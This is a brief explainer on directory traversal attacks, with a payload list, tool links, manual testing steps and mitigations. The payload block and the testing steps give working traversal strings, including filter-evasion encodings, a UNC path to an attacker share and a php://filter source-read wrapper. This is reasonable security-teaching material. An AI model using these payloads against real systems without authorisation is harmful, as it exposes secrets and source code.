# What is Directory Traversal?

Directory Traversal (also called path traversal) lets an attacker read (and sometimes write) files outside the intended directory by injecting `../` sequences into a file path the app builds from user input. It is a fast route to source code, config secrets, and `/etc/passwd`, and it frequently escalates into RCE when combined with file upload or log poisoning.

## How it works

- The app builds a file path from input, for example `readFile("/var/www/files/" + name)`
- `../` climbs up one directory each time
- Enough climbs and you escape the web root into the filesystem

## Test payloads

```text
# Basic
../../../../etc/passwd
..\..\..\..\windows\win.ini

# URL-encoded and double-encoded to beat filters
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Null byte / extension tricks (legacy stacks)
../../../../etc/passwd%00.png

# Absolute path and UNC
/etc/passwd
\\attacker\share\file
```

```php
# PHP wrapper to read source instead of executing it
php://filter/convert.base64-encode/resource=index.php
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - manual traversal and encoding tests
- [ffuf](https://github.com/ffuf/ffuf) - fuzz path parameters with a traversal wordlist
- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) - traversal fuzzer

## Manual testing

1. Find parameters that reference files: `file=`, `path=`, `page=`, `download=`
2. Request a known file with increasing `../` depth
3. If blocked, try URL-encoding, double-encoding, and mixed slashes
4. On PHP, use `php://filter` to exfiltrate source safely

## Mitigation

- Never build paths from raw input; map input to an allowlist of IDs
- Canonicalize the resolved path and confirm it stays inside the base directory
- Strip or reject `../`, encoded variants, and absolute paths
- Run with least privilege so escaped reads hit nothing sensitive

## Deep dive

- [Directory Traversal - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger path traversal labs](https://portswigger.net/web-security/file-path-traversal)

## CWE

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
